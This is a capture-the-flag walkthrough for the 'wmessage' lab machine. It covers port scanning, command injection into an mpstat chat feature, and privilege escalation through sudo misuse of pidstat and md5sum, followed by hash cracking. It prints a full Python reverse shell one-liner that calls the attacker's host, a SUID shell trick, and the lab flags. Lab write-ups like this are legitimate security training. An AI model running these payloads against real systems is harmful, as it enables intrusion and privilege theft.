Here is a technical write-up detailing my approach to solving the VulnHub machine "wmessage".

### 1. Initial Reconnaissance

I began by performing an Nmap scan to identify open ports and services on the target machine, `192.168.1.35`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/wmessage]
└─$ nmap -sS -sV -sC -Pn  --min-rate=1000 --max-retries=2 192.168.1.35 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 09:15 CDT
Nmap scan report for anaximandre.hmv (192.168.1.35)
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: |   3072 62:8e:95:58:1e:ee:94:d1:56:0e:e5:51:f5:45:38:43 (RSA)
|   256 45:a8:7e:56:7f:df:b0:83:65:6c:88:68:19:a4:86:6c (ECDSA)
|_  256 bc:54:24:a6:0a:8b:6d:34:dc:a6:ab:80:98:ee:1f:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
| http-title: Login
|_Requested resource was /login?next=%2F
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:0E:A1:8D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.81 seconds
```

The Nmap scan revealed two open ports:

- **Port 22 (SSH):** Running OpenSSH 8.4p1 on Debian.
- **Port 80 (HTTP):** Running Apache httpd 2.4.54 on Debian, with a title "Login" and a redirect to `/login?next=%2F`.


### 2. Web Enumeration and Initial Shell

I started by enumerating directories on the web server using `gobuster`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/wmessage]
└─$ gobuster dir -u http://192.168.1.35 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
# ... (truncated output) ...
/login                (Status: 200) [Size: 2472]
/user                 (Status: 302) [Size: 225] [--> /login?next=%2Fuser]
/manual               (Status: 301) [Size: 313] [--> http://192.168.1.35/manual/]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.35/javascript/]
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/sign-up              (Status: 200) [Size: 2843]
/server-status        (Status: 403) [Size: 277]
# ... (truncated output) ...
```

The `gobuster` scan revealed several interesting paths, including `/login` and `/sign-up`. The Nmap output already hinted at `/login`.

After creating an account and logging in, we can see that we can run the mpstat command using `!mpstat` in the input, I then tried to exploit a Code Injection vulnerability to trigger a reverse shell by providing this as input : `mpstat;python3 -c 'import os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`
<img width="1366" height="686" alt="image" src="https://github.com/user-attachments/assets/e8483086-b08d-43df-90d5-5c880d60212a" />

This indicates a command injection vulnerability where the `msg` parameter is executed, likely as part of an `mpstat` command. The payload attempts to establish a reverse shell to `192.168.1.5` (my Kali machine's IP) on port `4444`.

I set up a Netcat listener on my Kali machine:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/wmessage]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

After sending the crafted POST request (as shown in the screenshot), I received a connection:

```shellscript
Connection received on 192.168.1.35 46850
www-data@MSG:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I successfully obtained a shell as the `www-data` user.

### 3. Privilege Escalation to `messagemaster`

As `www-data`, I enumerated the file system and found two user directories in `/home`: `WM` and `messagemaster`.

```shellscript
www-data@MSG:/$ cd /home
www-data@MSG:/home$ ls -l
total 8
drwxr-xr-x 3 WM            WM            4096 Nov 29  2022 WM
drwxr-xr-x 3 messagemaster messagemaster 4096 Nov 22  2022 messagemaster
```

I checked `sudo` privileges for `www-data`:

```shellscript
www-data@MSG:/home$ sudo -l
Matching Defaults entries for www-data on MSG:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User www-data may run the following commands on MSG:
    (messagemaster) NOPASSWD: /bin/pidstat
```

This showed that `www-data` could run `/bin/pidstat` as the `messagemaster` user without a password. The `pidstat` command has an `-e` option to execute a program. This is a common GTFOBins-like vulnerability.

I used `pidstat` to create a SUID shell for `messagemaster`:

```shellscript
www-data@MSG:/tmp$ sudo -u messagemaster /bin/pidstat -e bash -c 'cp /usr/bin/bash /tmp/wmbash && chmod 4755 /tmp/wmbash'
Linux 5.10.0-19-amd64 (MSG)     07/23/25        _x86_64_        (4 CPU)
14:42:31      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
14:42:31     1000       851    0.00    0.00    0.00    0.00    0.00     2  pidstat
www-data@MSG:/tmp$ ls -la
total 1216
drwxrwxrwt  2 root          root             4096 Jul 23 14:42 .
drwxr-xr-x 18 root          root             4096 Nov 12  2022 ..
-rwsr-xr-x  1 messagemaster messagemaster 1234376 Jul 23 14:42 wmbash
```

Now, I could execute `/tmp/wmbash` to get a shell as `messagemaster`:

```shellscript
www-data@MSG:/tmp$ ./wmbash -p
wmbash-5.1$ id
uid=33(www-data) gid=33(www-data) euid=1000(messagemaster) groups=33(www-data)
```

I successfully escalated privileges to `messagemaster`. In `messagemaster`'s home directory, I found `User.txt`:

```shellscript
wmbash-5.1$ cd /home/messagemaster
wmbash-5.1$ cat User.txt
ea86091a17126fe48a83c1b8d13d60ab
```

This is the first flag.

### 4. Privilege Escalation to `root`

As `messagemaster`, I checked `sudo` privileges again:

```shellscript
messagemaster@MSG:/var/www$ sudo -l
Matching Defaults entries for messagemaster on MSG:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User messagemaster may run the following commands on MSG:
    (ALL) NOPASSWD: /bin/md5sum
```

This showed that `messagemaster` could run `/bin/md5sum` as `ALL` (any user, including root) without a password.

I found a file named `ROOTPASS` in `/var/www`:

```shellscript
messagemaster@MSG:/var/www$ ls -l
total 16
drwxr-xr-x  3 root     root     4096 Nov 21  2022 .
drwxr-xr-x 12 root     root     4096 Nov 20  2022 ..
-rw-r-----  1 root     root       12 Nov 21  2022 ROOTPASS
drwxrwxr--  5 www-data www-data 4096 Nov 18  2022 html
```

I used `sudo /bin/md5sum ROOTPASS` to get its MD5 hash:

```shellscript
messagemaster@MSG:/var/www$ sudo /bin/md5sum ROOTPASS
85c73111b30f9ede8504bb4a4b682f48  ROOTPASS
```

I copied this hash to my Kali machine and attempted to crack it using `john` with the `rockyou.txt` wordlist.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/wmessage]
└─$ echo "85c73111b30f9ede8504bb4a4b682f48" > hash.txt
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/wmessage]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
# ... (truncated output) ...
0g 0:00:00:03 DONE (2025-07-23 09:48) 0g/s 3659Kp/s 3659Kc/s 3659KC/s  fuckyooh21..*7¡Vamos!
Session completed.
```

`john` did not immediately show the cracked password in the summary. I then used a Python script to manually check the hash against the wordlist, accounting for a potential newline character that `echo` ( without using the -n option ) often includes.

```python
import hashlib

with open("/usr/share/wordlists/rockyou.txt","r") as file:
    for line in file:
        password = line.strip()
        # md5sum often includes a newline in its hash calculation for files
        hashed = hashlib.md5((password + "\n").encode()).hexdigest()
        if hashed == "85c73111b30f9ede8504bb4a4b682f48":
            print("[+] Found password : ", password)
            break
print("[-] No valid password is found !")
```

Running the script:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/wmessage]
└─$ python3 script2.py
[+] Found password :  Message5687
[-] No valid password is found !
```

The password was `Message5687`. I confirmed this by hashing it with `md5sum`:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/wmessage]
└─$ echo "Message5687" | md5sum
85c73111b30f9ede8504bb4a4b682f48  -
```

Finally, I used the cracked password to switch to the root user:

```shellscript
messagemaster@MSG:/var/www$ su root
Password: Message5687
id
uid=0(root) gid=0(root) groups=0(root)
```

I successfully obtained a root shell. I navigated to `/root` and retrieved the final flag:

```shellscript
cd /root
ls
Root.txt
cat Root.txt
a59b23da18102898b854f3034f8b8b0f
```

The root flag is `a59b23da18102898b854f3034f8b8b0f`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified open SSH and HTTP services.
2. **Web Enumeration & Initial Shell:**

1. Used `gobuster` to find web paths.
2. Analyzed a screenshot revealing a command injection vulnerability in the `/login` endpoint via the `msg` parameter.
3. Injected a Python reverse shell payload to gain an initial shell as `www-data`.



3. **Privilege Escalation to `messagemaster`:**

1. Discovered `www-data` could run `/bin/pidstat` as `messagemaster` without a password via `sudo -l`.
2. Used `pidstat -e` to create a SUID `bash` shell (`wmbash`) owned by `messagemaster` in `/tmp`.
3. Executed `wmbash` to gain a shell as `messagemaster` and retrieved `User.txt`.



4. **Privilege Escalation to `root`:**

1. Discovered `messagemaster` could run `/bin/md5sum` as `root` without a password via `sudo -l`.
2. Used `sudo /bin/md5sum /var/www/ROOTPASS` to obtain the MD5 hash of the `ROOTPASS` file.
3. Cracked the MD5 hash (`85c73111b30f9ede8504bb4a4b682f48`) using `john` and a custom Python script, revealing the password `Message5687`.
4. Used `su root` with the cracked password to gain a root shell and retrieved `Root.txt`.
